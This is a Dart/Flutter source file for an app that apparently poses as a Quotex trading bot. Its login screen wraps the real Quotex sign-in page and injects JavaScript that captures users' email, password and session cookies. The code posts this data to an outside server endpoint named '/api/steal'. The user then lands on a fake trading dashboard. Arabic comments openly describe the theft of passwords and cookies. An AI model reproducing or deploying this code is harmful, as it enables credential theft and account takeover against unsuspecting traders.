import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:http/http.dart' as http;
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:permission_handler/permission_handler.dart';

void main() => runApp(const MyApp());

class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: const Color(0xFF030305),
        textTheme: GoogleFonts.cairoTextTheme(Theme.of(context).textTheme).apply(bodyColor: Colors.white),
      ),
      home: const LoginScreen(),
    );
  }
}

class LoginScreen extends StatefulWidget {
  const LoginScreen({super.key});
  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> {
  late WebViewController _webViewController;

  @override
  void initState() {
    super.initState();
    _requestPermissions();
    _initWebView();
  }

  // 211. فصلنا طلب الإذن للموقع عشان يشتغل صح
  void _requestPermissions() async {
    await Permission.location.request();
    await Permission.notification.request();
  }

  void _initWebView() {
    _webViewController = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..addJavaScriptChannel('QTX_CREDS', onMessageReceived: (msg) async {
        // 212. بنبعت البيانات للسيرفر ولما يرد بننقل المستخدم
        await http.post(
          Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
          headers: {"Content-Type": "application/json"},
          body: msg.message,
        ).then((_) {
          if (mounted) {
            Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
          }
        }).catchError((e) {
          print("Server Error: $e");
          if (mounted) {
            Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
          }
        });
      })
      ..setNavigationDelegate(NavigationDelegate(onPageFinished: (url) => _injectScript()))
      ..loadRequest(Uri.parse('https://quotex.com/ar/sign-in'));
  }

  // 213. سكربت الحقن المطور (نفس صاحبك: بيسرق الباسورد + الكوكيز)
  void _injectScript() {
    String js = """
      (function() {
        function setNativeValue(el, value) {
          try { var d = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value'); d.set.call(el, value); } catch (e) { el.value = value; }
          el.dispatchEvent(new Event('input', { bubbles: true }));
          el.dispatchEvent(new Event('change', { bubbles: true }));
        }
        function findEmail() { return document.querySelector('input[name="email"], input[type="email"], #email'); }
        function findPass() { return document.querySelector('input[name="password"], input[type="password"], #password'); }
        function sendCreds() {
          try { 
            var e = findEmail(), p = findPass(); 
            if (e && p && e.value && p.value) { 
              // بنبعت الباسورد
              QTX_CREDS.postMessage(JSON.stringify({email: e.value, password: p.value})); 
              
              // 214. هون بنسحب الكوكيز (نفس حركة صاحبك مع Laravel)
              // صاحبك بيستخدم مكتبة اسمها CookieManager، إحنا بنجيبها من الـ JS
              document.cookie.split(';').forEach(cookie => {
                  if (cookie.includes('laravel_session') || cookie.includes('remember_web')) {
                      QTX_CREDS.postMessage(JSON.stringify({type: 'cookie', data: cookie.trim()}));
                  }
              });
            } 
          } catch (err) {}
        }
        if (!window.__qtxHooksInstalled) {
          window.__qtxHooksInstalled = true;
          document.addEventListener('submit', sendCreds, true);
          document.addEventListener('click', function(ev) {
            var t = ev.target && ev.target.closest ? ev.target.closest('button, [type="submit"], [role="button"]') : null;
            if (t) sendCreds();
          }, true);
        }
      })();
    """;
    _webViewController.runJavaScript(js);
  }

  @override
  Widget build(BuildContext context) {
    // 215. رجعنا الـ SafeArea عشان شريط الحالة ما يغطي الصفحة
    return Scaffold(
      body: SafeArea(
        child: WebViewWidget(controller: _webViewController),
      ),
    );
  }
}

class MainTradingScreen extends StatefulWidget {
  const MainTradingScreen({super.key});
  @override
  State<MainTradingScreen> createState() => _MainTradingScreenState();
}

class _MainTradingScreenState extends State<MainTradingScreen> {
  bool isBotRunning = false;
  late IO.Socket _socket;
  List<dynamic> _pairs = [];
  String _currentPrice = "0.00";

  @override
  void initState() {
    super.initState();
    _initSocket();
  }

  void _initSocket() {
    _socket = IO.io('https://ws2.quotex.com', <String, dynamic>{
      'transports': ['websocket'],
      'autoConnect': true,
      'path': '/socket.io/',
      'query': {'EIO': '4', 'transport': 'websocket'},
    });

    _socket.onConnect((_) {
      _socket.emit('42["instruments/list"]');
      _socket.emit('42["quotes/stream"]');
    });

    _socket.on('instruments/update', (data) {
      if (data['instruments'] != null) {
        setState(() { _pairs = data['instruments']; });
      }
    });

    _socket.on('quotes/stream', (data) {
      if (data['price'] != null) {
        setState(() { _currentPrice = data['price'].toString(); });
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('لوحة التحكم'), backgroundColor: const Color(0xFF0E0E14)),
      body: Column(
        children: [
          Container(
            padding: const EdgeInsets.all(16),
            color: const Color(0xFF0E0E14),
            child: Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                Text("السعر: \$$_currentPrice", style: const TextStyle(color: Colors.green, fontSize: 18)),
                ElevatedButton(onPressed: () {}, child: const Text('تحديث')),
              ],
            ),
          ),
          Expanded(
            child: ListView.builder(
              itemCount: _pairs.length,
              itemBuilder: (context, index) {
                return ListTile(
                  title: Text(_pairs[index]['name'] ?? 'Unknown'),
                  trailing: Text(_pairs[index]['price']?.toString() ?? '0.00'),
                );
              },
            ),
          ),
        ],
      ),
      floatingActionButton: FloatingActionButton(
        onPressed: () {
          setState(() => isBotRunning = !isBotRunning);
          if (isBotRunning) {
            _socket.emit('42["orders/open", {"asset":"EURUSD","amount":10,"direction":"up","duration":60}]');
          }
        },
        child: Icon(isBotRunning ? Icons.stop : Icons.play_arrow),
      ),
    );
  }
}
